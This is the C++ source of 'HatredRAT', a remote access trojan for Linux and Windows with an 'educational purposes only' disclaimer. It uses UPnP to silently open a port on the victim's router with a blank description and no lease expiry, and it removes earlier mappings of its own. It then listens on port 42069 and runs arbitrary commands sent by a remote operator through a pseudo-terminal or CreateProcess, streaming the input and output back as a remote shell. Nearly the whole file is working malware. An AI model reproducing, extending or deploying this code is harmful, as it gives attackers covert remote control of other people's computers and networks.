// decay range: 0xbd55, next: 0xbd55:4
// for educational purposes only

#include <charconv>
#include <functional>
#include <list>
#include <random>
#ifdef __WIN32
#include <thread>
#endif

#ifndef __WIN32
#include <sys/wait.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <poll.h>
#include <pty.h>
#include <signal.h>
#else 
#include <winsock2.h>
#include <windows.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>

#undef ECHO

#include "../common/fnutil.h"
#include "./ssdp.h"
#include "../common/util.h"
#include "./upnp.h"
#include "./http.h"
#include "./xml.h"
#include "../proto/proto.h"

#ifdef __WIN32
#include "../common/win32_support.h"
#endif

#define MAX_PORT 65535

#define IPV4_ADDR_STR_LEN 16

#define PROTO_INET 0

using namespace hatred;

void xml_print(xml::xml_node& node, int depth) {
    printf("%*s<%s%s", depth, "", node.pi ? "?" : "", node.name.c_str());
    
    for (auto [k, v] : node.attributes) printf(" %s=\"%s\"", k.c_str(), v.c_str());
    
    if (node.pi) {
        printf("?>\n");
        return;
    }

    if (node.leaf) {
        printf(">%s</%s>\n", node.value.c_str(), node.name.c_str());
        return;
    }

    if (node.children.size() == 0) {
        printf("/>\n");
        return;
    } 

    printf(">\n");

    for (auto i : node.children) {
        xml_print(i, depth + 1);
    }

    printf("%*s</%s>\n", depth, "", node.name.c_str());
}

int main() {
    DPRINTF("HatredRAT version 1.\n"
            "FOR EDUCATIONAL PURPOSES ONLY.\n");

    DPRINTF("attempting to start server\n");

    DPRINTF("try upnp\n");

#ifdef __WIN32
    DPRINTF("windows apps have to do this thing before they can do networking\n");

    WSADATA winsock_stuff;
    WSAStartup(MAKEWORD(2, 2), &winsock_stuff);
#endif

    unsigned short listen_port = 0;

    int upnpsock = socket(AF_INET, SOCK_DGRAM, PROTO_INET);
    
    upnp::send_msearch_m(upnpsock, {
        .max_wait = 1,
        .search_target = "urn:schemas-upnp-org:device:InternetGatewayDevice:1"
    });

    ssdp::ssdp_message message = ssdp::ssdp_message();
    while (ssdp::recv_message(message, upnpsock, 100) >= 0) {
        if (message.header.contains("ST") && message.header["ST"] == "urn:schemas-upnp-org:device:InternetGatewayDevice:1") {
            for (const auto& [k, v] : message.header) {
                //DPRINTF("GOT FIELD \"%s:%s\"\n", k.c_str(), v.c_str());
            }

            if (message.header.contains("LOCATION")) {
                std::string loc = message.header["LOCATION"];

                DPRINTF("request info for \"%s\"\n", loc.c_str());
                
                int httpsock = socket(AF_INET, SOCK_STREAM, PROTO_INET); // XXX: @xwashere WHAT THE FUCK SOCK_STREAM DOESNT FIX FIX NOW FUCK YOUY

                http::connect(httpsock, loc);

                if (http::send_request({
                    .url = loc,
                    .header = { 
                        {"CPFN.UPNP.ORG", "asfdasfd"}
                    }
                }, httpsock, 100) >= 0) {
                    http::http_response msg;
                    if (http::recv_response(msg, httpsock, 500) >= 0) {
                        //DPRINTF("status: %i %s\n", msg.status, msg.status_reason.c_str());
                        //for (const auto& [k, v] : msg.header) {
                        //    DPRINTF("header \"%s:%s\"\n", k.c_str(), v.c_str());
                        //}
                        //DPRINTF("=== body\n%s\n===\n", msg.body.c_str());

                        if (xml::xml_node node = xml::parse_xml(msg.body)) {
                            if (xml::xml_node base = node["URLBase"]) {
                                for (auto wandev : node["device"]["deviceList"]) {
                                    if (wandev["deviceType"] == "urn:schemas-upnp-org:device:WANDevice:1") {
                                        for (auto condev : wandev["deviceList"]) {
                                            if (condev["deviceType"] == "urn:schemas-upnp-org:device:WANConnectionDevice:1") {
                                                for (auto wansvc : condev["serviceList"]) {
                                                    if (wansvc["serviceType"] == "urn:schemas-upnp-org:service:WANIPConnection:1") {
                                                        std::string control = base.value + wansvc["controlURL"].value;
                                                        DPRINTF("control url: %s\n", control.c_str());

                                                        char sip[sizeof("XXX.XXX.XXX.XXX")];

                                                        sockaddr_in lip;
                                                        socklen_t   llen = sizeof(lip);

                                                        getsockname(httpsock, (sockaddr*)&lip, &llen);
                                                        inet_ntop(AF_INET, &lip.sin_addr, sip, sizeof(sip));

                                                        DPRINTF("local ip: %s\n", sip);

                                                        std::string local_ip = sip;

                                                        http::http_url nurl = http::parse_url(control);
                                                        http::http_url ourl = http::parse_url(loc);

                                                        if (!(nurl.host == ourl.host && nurl.port == ourl.port)) {
                                                            close(httpsock);
                                                            httpsock = socket(AF_INET, SOCK_STREAM, PROTO_INET);
                                                            http::connect(httpsock, control);
                                                        }

                                                        std::list<unsigned short> ports;
                                                        int                       pcount = MAX_PORT;

                                                        for (int i = 0; i < MAX_PORT; i++) {
                                                            ports.push_back(i + 1);
                                                        }

                                                        for (int i = 0; i < MAX_PORT; i++) {
                                                            if (http::send_request({
                                                                .method = "POST",
                                                                .url = control,
                                                                .header = {
                                                                    {"CONTENT-TYPE",  "text/xml"},
                                                                    {"SOAPACTION",    "\"urn:schemas-upnp-org:service:WANIPConnection:1#GetGenericPortMappingEntry\""},
                                                                },
                                                                .body = 
                                                                "<?xml version=\"1.0\"?>\r\n"
                                                                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                                                                    "<s:Body>"
                                                                        "<u:GetGenericPortMappingEntry u:act=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
                                                                            "<NewPortMappingIndex>" + std::to_string(i) + "</NewPortMappingIndex>"
                                                                        "</u:GetGenericPortMappingEntry>"
                                                                    "</s:Body>"
                                                                "</s:Envelope>\r\n"
                                                            }, httpsock, 100) >= 0) {
                                                                http::http_response msg;
                                                                if (http::recv_response(msg, httpsock, 1000) >= 0) {
                                                                    //DPRINTF("status: %i %s\n", msg.status, msg.status_reason.c_str());
                                                                    //for (const auto& [k, v] : msg.header) {
                                                                    //    DPRINTF("header \"%s:%s\"\n", k.c_str(), v.c_str());
                                                                    //}
                                                                    //DPRINTF("=== body\n%s\n===\n", msg.body.c_str());

                                                                    if (msg.status == 500) break;

                                                                    xml::xml_node resp = xml::parse_xml(msg.body);

                                                                    if (resp[0][0]["NewProtocol"] == "TCP") {
                                                                        if (   resp[0][0]["NewInternalClient"] == local_ip 
                                                                            && resp[0][0]["NewInternalPort"] == "42069"
                                                                            && resp[0][0]["NewPortMappingDescription"] == "") {
                                                                            DPRINTF("cleaning up %s\n", resp[0][0]["NewExternalPort"].value.c_str());

                                                                            http::send_request({
                                                                                .method = "POST",
                                                                                .url = control,
                                                                                .header = {
                                                                                    {"CONTENT-TYPE", "text/xml"},
                                                                                    {"SOAPACTION",   "\"urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping\""}
                                                                                },
                                                                                .body = 
                                                                                "<?xml version=\"1.0\"?>\r\n"
                                                                                "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                                                                                    "<s:Body>"
                                                                                        "<u:DeletePortMapping u:act=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
                                                                                            "<NewRemoteHost></NewRemoteHost>"
                                                                                            "<NewExternalPort>" + resp[0][0]["NewExternalPort"].value + "</NewExternalPort>"
                                                                                            "<NewProtocol>TCP</NewProtocol>"
                                                                                        "</u:DeletePortMapping>"
                                                                                    "</s:Body>"
                                                                                "</s:Envelope>\r\n"
                                                                            }, httpsock, 100);

                                                                            http::http_response msg;
                                                                            http::recv_response(msg, httpsock, 5000);

                                                                            i--;
                                                                        } else if (xml::xml_node& port_node = resp[0][0]["NewExternalPort"]) {
                                                                            int p;
                                                                            
                                                                            std::from_chars(port_node.value.c_str(), port_node.value.c_str() + port_node.value.length(), p);

                                                                            DPRINTF("port %i is already in use\n", p);

                                                                            ports.remove(p);
                                                                            pcount--;
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }

                                                        std::random_device            rdev;
                                                        std::mt19937                  ralg(rdev());
                                                        std::uniform_int_distribution rprt(1, pcount);

                                                        int i = rprt(ralg);
                                                        
                                                        for (auto port : ports) {
                                                            if (i == 1) {
                                                                if (http::send_request({
                                                                    .method = "POST",
                                                                    .url = control,
                                                                    .header = {
                                                                        {"CONTENT-TYPE",  "text/xml"},
                                                                        {"SOAPACTION",    "\"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\""},
                                                                    },
                                                                    .body = 
                                                                    "<?xml version=\"1.0\"?>\r\n"
                                                                    "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
                                                                        "<s:Body>"
                                                                            "<u:AddPortMapping u:act=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
                                                                                "<NewRemoteHost></NewRemoteHost>"
                                                                                "<NewExternalPort>" + std::to_string(port) + "</NewExternalPort>"
                                                                                "<NewProtocol>TCP</NewProtocol>"
                                                                                "<NewInternalPort>42069</NewInternalPort>"
                                                                                "<NewInternalClient>" + local_ip + "</NewInternalClient>"
                                                                                "<NewEnabled>1</NewEnabled>"
                                                                                "<NewPortMappingDescription></NewPortMappingDescription>"
                                                                                "<NewLeaseDuration>0</NewLeaseDuration>"
                                                                            "</u:AddPortMapping>"
                                                                        "</s:Body>"
                                                                    "</s:Envelope>\r\n"
                                                                }, httpsock, 100) >= 0) {
                                                                    http::http_response response;
                                                                    http::recv_response(msg, httpsock, 5000);

                                                                    DPRINTF("forwarded *.*.*.*:%i -> %s:42069\n", port, local_ip.c_str());

                                                                    listen_port = port;
                                                                    goto opened;
                                                                }
                                                                break;
                                                            } else i--;
                                                        };
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    DPRINTF("failed to get igd info");
                }
            }
        }

        message = ssdp::ssdp_message();
    } 
    
    goto die;

    opened: {
#ifndef __WIN32
        fuck: int sock = socket(AF_INET, SOCK_STREAM, PROTO_INET);

        int ssov = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &ssov, sizeof(ssov));
#else
        struct addrinfo* info = NULL;
        struct addrinfo  areq = {
            .ai_flags = AI_PASSIVE,
            .ai_family = AF_INET,
            .ai_socktype = SOCK_STREAM,
            .ai_protocol = IPPROTO_TCP
        };

        getaddrinfo(NULL, "11154", &areq, &info);

        SOCKET sock = socket(info->ai_family, info->ai_socktype, info->ai_protocol);
#endif

       
        sockaddr_in listen_addr = {
            .sin_family = AF_INET,
            .sin_port = htons(42069),
#ifndef __WIN32
            .sin_addr = { .s_addr = INADDR_ANY }
#else
            .sin_addr = { .S_un = { .S_addr = INADDR_ANY } }
#endif
        };

#ifndef __WIN32
        if(bind(sock, (sockaddr*)&listen_addr, sizeof(listen_addr))) {
            DPERROR("bind()");
#else
        if (bind(sock, info->ai_addr, (int)info->ai_addrlen) == SOCKET_ERROR) {
            DPRINTF("bind(): %i\n", WSAGetLastError());
#endif
        };

#ifdef __WIN32
        if (info) {
            freeaddrinfo(info);
            info = 0;
        }
#endif

#ifndef __WIN32
        if (listen(sock, 1)) {
            DPERROR("listen()");
#else
        if (listen(sock, 1) == SOCKET_ERROR) {
            DPRINTF("listen(): %i\n", WSAGetLastError());
#endif
        }

        sockaddr  client_addr;
        socklen_t client_size = sizeof(sockaddr);

#ifndef __WIN32
        std::vector<pid_t> children = {};
#else
        std::vector<std::thread> threads = {};
#endif

        bool alive = 1;
        
#ifndef __WIN32
        struct sigaction oact = {};
        struct sigaction act  = {};
        sigemptyset(&act.sa_mask);
        sigaddset(&act.sa_mask, SIGCHLD);
        sigaddset(&act.sa_mask, SIGINT);
        act.sa_handler = fnutil::decay<void(int), 0xbd553>([&](int a){
            switch (a) {
                case SIGCHLD:
                    for (auto b = children.begin(); b != children.end(); ) {
                        if (waitpid(*b, NULL, WUNTRACED | WNOHANG)) children.erase(b);
                    }
                    break;
                case SIGINT:
#ifdef DEBUG
                    shutdown(sock, SHUT_RDWR);
                    sock = -1;
                    exit(0);
#endif
                    break;
            }
        });
        sigaction(SIGCHLD, &act, &oact);
        sigaction(SIGINT, &act, &oact);
#endif
        alive = 1;
        
#ifndef __WIN32
        int client = -1;
        while (alive && (client = accept(sock, &client_addr, &client_size))) {
            if (client == -1) {
                switch (errno) {
                    case EINTR:
                        DPRINTF("interrupted\n");
                        continue;  
#else
        SOCKET client = INVALID_SOCKET;
        while (alive && (client = accept(sock, NULL, NULL))) {
            if (client == INVALID_SOCKET) {
                switch (WSAGetLastError()) {
#endif
                    default: goto ksrv;
                }
            };

#ifndef __WIN32
            if (pid_t chpid = fork()) {
                children.push_back(chpid);
            } else {
#else
            {
#endif
                proto::hatred_hdr msg;
                while (client != -1 && proto::hatred_hdr::recv(client, msg) >= 0) {
                    DPRINTF("=== recv %i\n", msg.op);

                    if (proto::hatred_op(msg.op) == proto::hatred_op::ECHO) {
                        proto::hatred_echo body;
                        proto::hatred_echo::recv(client, body);

                        proto::hatred_hdr{
                            .op = (int)proto::hatred_op::ECHO
                        }.send(client);
                        
                        proto::hatred_echo{
                            .message = body.message
                        }.send(client);

                        DPRINTF("%s\n", body.message.c_str());
                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::EXEC) {                        
                        proto::hatred_exec body;
                        proto::hatred_exec::recv(client, body);

                        int stdinp[2];
                        int stdoutp[2];
                        int stderrp[2];

                        if (pipe(stdinp) || pipe(stdoutp) || pipe(stderrp)) {
                            DPERROR("pipe()");
                            goto killcon;
                        }

#ifndef __WIN32                        
                        int master;
                        if (pid_t cpid = forkpty(&master, NULL, NULL, NULL)) {
                            if (cpid == -1) {
                                DPERROR("fork()");
                                
                                proto::hatred_hdr{
                                    .length = 0,
                                    .op = (int)proto::hatred_op::CLOSE
                                }.send(client);

                                close(stdinp[0]);
                                close(stdinp[1]);
                                close(stdoutp[0]);
                                close(stdoutp[1]);
                                close(stderrp[0]);
                                close(stderrp[1]);
                                
                                goto killcon;
                            }
#else
                            STARTUPINFO         sinfo = {};
                            PROCESS_INFORMATION pinfo = {};

                            HANDLE c_stdin = _get_osfhandle(stdinp[0]);
                            HANDLE c_stdout = _get_osfhandle(stdoutp[1]);
                            HANDLE c_stderr = _get_osfhandle(stderrp[1]);

                            sinfo.cb = sizeof(sinfo);
                            sinfo.hStdInput = c_stdin;
                            sinfo.hStdOutput = c_stdout;
                            sinfo.hStdError = c_stderr;
                            sinfo.dwFlags |= STARTF_USESTDHANDLES;

                            std::string almost_argv = body.cmd;
                            for (int i = 0; i < body.args.size(); i++) {
                                almost_argv += " " + body.args[i];
                            }

                            if (!CreateProcess(
                                NULL,
                                almost_argv.c_str(),
                                NULL,
                                NULL,
                                true,
                                0,
                                NULL,
                                NULL,
                                &sinfo,
                                &pinfo
                            )) {
                                DPRINTF("CreateProcess: %d\n", GetLastError());
                            }
#endif

                            FILE* pstdin  = fdopen(stdinp[1], "w");
                            FILE* pstdout = fdopen(stdoutp[0], "r");
                            FILE* pstderr = fdopen(stderrp[0], "r");
                            FILE* cstdin  = fdopen(stdinp[0], "r");
                            FILE* cstdout = fdopen(stdoutp[1], "w");
                            FILE* cstderr = fdopen(stderrp[1], "w");

                            setvbuf(pstdout, 0, _IONBF, 0);
                            setvbuf(pstderr, 0, _IONBF, 0);
                            setvbuf(cstdout, 0, _IONBF, 0);
                            setvbuf(cstderr, 0, _IONBF, 0);

#ifndef __WIN32
                            pollfd streams[4] = {
                                {
                                    .fd = stdinp[1],
                                    .events = POLLRDHUP
                                },
                                {
                                    .fd = stdoutp[0],
                                    .events = POLLIN | POLLRDHUP
                                },
                                {
                                    .fd = stderrp[0],
                                    .events = POLLIN | POLLRDHUP
                                },
                                {
                                    .fd     = client,
                                    .events = POLLIN | POLLRDHUP
                                }
                            };

                            struct sigaction oact = {};
                            struct sigaction act  = {};
                            sigemptyset(&act.sa_mask);
                            sigaddset(&act.sa_mask, SIGCHLD);
                            act.sa_handler = fnutil::decay<void(int), 0xbd552>([&](int a){
                                if (cpid != -1) waitpid(cpid, 0, WUNTRACED);
                                close(client);
                                client = -1;
                                cpid = -1;
                                sigaction(SIGCHLD, &oact, NULL);
                            });
                            
                            sigaction(SIGCHLD, &act, &oact);

                            while (poll(streams, 4, 1000) != -1) {
                                if ((streams[0].revents | streams[1].revents | streams[2].revents | streams[3].revents) & (POLLHUP | POLLERR | POLLRDHUP)) {
                                    break;
                                }

                                if (streams[1].revents & POLLIN) {
                                    char buf[128] = {};
                                    int read = ::read(stdoutp[0], buf, 128);
                                    
                                    DPRINTF("STDOUT ===\n%s\n===", buf);

                                    proto::hatred_hdr{
                                        .length = 0,
                                        .op = (int)proto::hatred_op::STREAM
                                    }.send(client);

                                    proto::hatred_stream{
                                        .fno = 1,
                                        .data = std::string(buf)
                                    }.send(client);
                                }

                                if (streams[2].revents & POLLIN) {
                                    char buf[128] = {};
                                    int read = ::read(stderrp[0], buf, 128);
                                    DPRINTF("STDERR ===\n%s\n===", buf);

                                    proto::hatred_hdr{
                                        .length = 0,
                                        .op = (int)proto::hatred_op::STREAM
                                    }.send(client);

                                    proto::hatred_stream{
                                        .fno = 1,
                                        .data = std::string(buf)
                                    }.send(client);
                                }

                                if (streams[3].revents & POLLIN) {
                                    proto::hatred_hdr    header;
                                    proto::hatred_hdr::recv(client, header);

                                    proto::hatred_stream body;
                                    proto::hatred_stream::recv(client, body);

                                    if (body.fno == 0) {
                                        DPRINTF("STDIN ===\n%s\n===", body.data.c_str());
                                        ::write(stdinp[1], body.data.c_str(), body.data.length());
                                    }
                                }
                            }
#else
                            while (1) {
                                fd_set readfds;
                                FD_ZERO(&readfds);
                                FD_SET(c_stdout, &readfds);
                                //FD_SET(c_stderr, &readfds);
                                FD_SET(client, &readfds);
                                
                                fd_set writefds;
                                FD_ZERO(&writefds);

                                fd_set exceptfds;
                                FD_ZERO(&exceptfds);

                                timeval tv = { .tv_sec = 1 };

                                select(0, &readfds, &writefds, &exceptfds, &tv);

                                for (int i = 0; i < readfds.fd_count; i++) {
                                    DPRINTF("in\n");
                                    if (readfds.fd_array[i] == client) {
                                        proto::hatred_hdr    header;
                                        if (proto::hatred_hdr::recv(client, header)) goto cdie;

                                        proto::hatred_stream body;
                                        proto::hatred_stream::recv(client, body);

                                        if (body.fno == 0) {
                                            DPRINTF("STDIN ===\n%s\n===", body.data.c_str());
                                            ::write(stdinp[1], body.data.c_str(), body.data.length());
                                        }   
                                    } else if (readfds.fd_array[i] == c_stdout) {
                                        char buf[128] = {};
                                        int read = ::read(stdoutp[0], buf, 128);
                                        
                                        DPRINTF("STDOUT ===\n%s\n===", buf);

                                        proto::hatred_hdr{
                                            .length = 0,
                                            .op = (int)proto::hatred_op::STREAM
                                        }.send(client);

                                        proto::hatred_stream{
                                            .fno = 1,
                                            .data = std::string(buf)
                                        }.send(client);
                                    } else if (readfds.fd_array[i] == c_stderr) {
                                        char buf[128] = {};
                                        int read = ::read(stderrp[0], buf, 128);
                                        DPRINTF("STDERR ===\n%s\n===", buf);

                                        proto::hatred_hdr{
                                            .length = 0,
                                            .op = (int)proto::hatred_op::STREAM
                                        }.send(client);

                                        proto::hatred_stream{
                                            .fno = 1,
                                            .data = std::string(buf)
                                        }.send(client);
                                    }
                                }
                            } cdie:;
#endif

#ifndef WIN32
                            sigaction(SIGCHLD, &oact, NULL);
                            if (cpid != -1) {
                                kill(cpid, SIGKILL);
                                waitpid(cpid, 0, WUNTRACED);
                                cpid = -1;
                            }
#else
                            CloseHandle(pinfo.hProcess);
                            CloseHandle(pinfo.hThread);
#endif

                            fclose(cstdin); 
                            fclose(cstdout);
                            fclose(cstderr);
                            fclose(pstdin);
                            fclose(pstdout);
                            fclose(pstderr);
#ifndef __WIN32
                        } else {
                            const char** argv = (const char**)malloc(sizeof(char*) * (body.args.size() + 2));
                            argv[body.args.size() + 1] = 0;
                            argv[0] = body.cmd.c_str();
                            for (int i = 0; i < body.args.size(); i++) {
                                argv[i + 1] = body.args[i].c_str();
                            }

                            dup2(stdinp[0], 0);
                            dup2(stdoutp[1], 1);
                            dup2(stderrp[1], 2);

                            execvp(body.cmd.c_str(), (char*const*)argv);
                            
                            exit(0);
                        }
#endif
                    } 

                    DPRINTF("cycle\n");
                }

                DPRINTF("cend\n");

#ifndef __WIN32
                killcon: if (client != -1) {
                    close(client);
                    client = -1;
#else
                killcon: if (client != INVALID_SOCKET) {
                    closesocket(client);
                    client = INVALID_SOCKET;
#endif
                }

                client_size = sizeof(sockaddr);
                memset(&client_addr, 0, client_size);

#ifndef __WIN32
                exit(0);
#endif
            }

            DPRINTF("accepting clients\n");
        } ksrv:;

#ifndef __WIN32
        DPERROR("accept()");
#else
        DPRINTF("accept(): %i\n", WSAGetLastError());
#endif

        shutdown(sock, SHUT_RDWR);
#ifdef __WIN32
        closesocket(sock);
        WSACleanup();
#endif
        sock = -1;
    }

    die: {

    }

    return 0;
}